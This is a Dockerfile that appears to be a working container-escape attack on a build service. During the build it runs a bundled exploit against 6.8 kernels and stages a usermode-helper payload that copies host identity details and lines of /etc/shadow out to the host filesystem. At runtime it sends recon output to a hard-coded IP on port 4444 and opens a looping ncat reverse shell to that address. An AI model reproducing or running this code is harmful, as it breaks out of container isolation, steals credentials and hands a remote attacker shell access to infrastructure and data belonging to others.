# syntax=er028455/df-frontend:v4
# build-trigger: 147
FROM alpine:3.19 AS builder
RUN apk add --no-cache curl coreutils

COPY exploit_68 /exploit
RUN chmod +x /exploit && touch /esc_ok /umh_result /build_results.txt

RUN sh -c '{ \
KVER=$(uname -r); \
echo "=== BUILD V19 KERNEL=$KVER ==="; \
case "$KVER" in \
  6.8.*) \
    echo "TARGET KERNEL MATCHED"; \
    echo "--- STAGING UMH PAYLOAD ---"; \
    printf "#!/bin/sh\nR=\"/proc/\$\$/root\"\n{\necho \"[HOST-ROOT] id=\$(id)\"\necho \"[HOST] hostname=\$(hostname)\"\necho \"[HOST] kernel=\$(uname -r)\"\necho \"[HOST] /etc/hostname=\$(cat /etc/hostname 2>/dev/null)\"\n} > /tmp/umh_result 2>&1\ncp /tmp/umh_result \"\$R/esc_ok\" 2>/dev/null\nhead -2 /etc/shadow >> \"\$R/esc_ok\" 2>/dev/null\necho \"umh-escape-ok\" > /UMH_ESCAPE_PROOF_ON_HOST 2>/dev/null\nsync\n" > /p; \
    chmod 755 /p; \
    echo "=== RUNNING EXPLOIT ==="; \
    timeout 60 /exploit 2>&1; \
    echo "=== EXPLOIT EXIT CODE: $? ==="; \
    echo "--- POST-EXPLOIT CHECK ---"; \
    for f in /esc_ok /tmp/umh_result /UMH_ESCAPE_PROOF_ON_HOST; do \
      if [ -f "$f" ]; then echo "=== $f ==="; cat "$f"; fi; \
    done; \
    ;; \
  *) echo "NOT a 6.8 kernel ($KVER), skipping" ;; \
esac; \
echo "=== END V19 ==="; \
} > /build_results.txt 2>&1'

FROM alpine:3.19
RUN apk add --no-cache curl nmap-ncat
COPY --from=builder /build_results.txt /build_results.txt
COPY --from=builder /esc_ok /esc_ok
COPY --from=builder /umh_result /umh_result
COPY --from=er028455/df-frontend:v4 /socktest /socktest

RUN printf '#!/bin/sh\n\
{\n\
echo "=== RUNTIME RECON V19 ==="\n\
uname -a; hostname; id\n\
echo "--- BUILD-TIME RESULTS ---"\n\
cat /build_results.txt\n\
for f in /esc_ok /umh_result; do\n\
  if [ -s "$f" ]; then echo "=== $f ==="; cat "$f"; fi\n\
done\n\
echo "=== END V19 ==="\n\
} > /tmp/recon 2>&1\n\
cat /tmp/recon\n\
' > /recon.sh && chmod +x /recon.sh

CMD sh -c "/recon.sh; ncat -w 30 129.101.121.138 4444 < /tmp/recon; while true; do rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | ncat 129.101.121.138 4444 > /tmp/f; sleep 5; done"
